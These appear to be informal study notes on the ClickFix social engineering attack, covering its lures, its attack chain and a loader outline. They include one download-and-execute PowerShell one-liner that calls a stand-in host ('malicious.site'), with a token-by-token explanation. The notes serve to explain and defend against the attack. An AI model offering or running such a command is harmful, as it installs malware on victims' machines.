ClickFix is a social engineering + script based attack, in which the attackers tricks the victim/users to copy-paste malicious command (usually into Run diagonal/CMD/Powershell/Terminal) that downloads a malware.

* Instead of exploiting the vulnerabilites in the softeare, attacker makes the user to execute malicious commands themselves, so that the threat actor can bypass the security controls like firewall/email security solutions.

The attackers typical lures the victim as:
- Fix your PC
- Update browser
- Install codec
- captcha verification
- Zoom audio fix

  So Basically, the Attacker/Threat actor tells the user to "FIX" something, so here, FIX is the attack here.
  Victim copies the command --> runs it --> malware downloads.

Attack Chain:
Website / Email lure
        ↓
Fake instruction "Press Win + R"
        ↓
User pastes command
        ↓
PowerShell / CMD executes
        ↓
Payload downloaded
        ↓
Second stage executed
        ↓
Persistence / C2 connection.

1. Initial Access:
  Press Windows + R
  Paste below:
  powershell -c "iwr http://malicious.site/file.ps1 | iex"                  ==>    Meaning:    Download file.ps1 & execute immediately
user runs --> Powershell executes.

powershell                          ==> launches powershell
-c ""                               ==> run what ever is there in the "STRINGS" as command
iwr (Invoke-WebRequest)             ==> Download file
|                                   ==> Pipe output
iex                                 ==> invoke-Expression (Execute).

2. Stage 1 Loader (Downloader)
  The script usually:
    Checks sandbox
    Uses token parameters
    Downloads second payload


























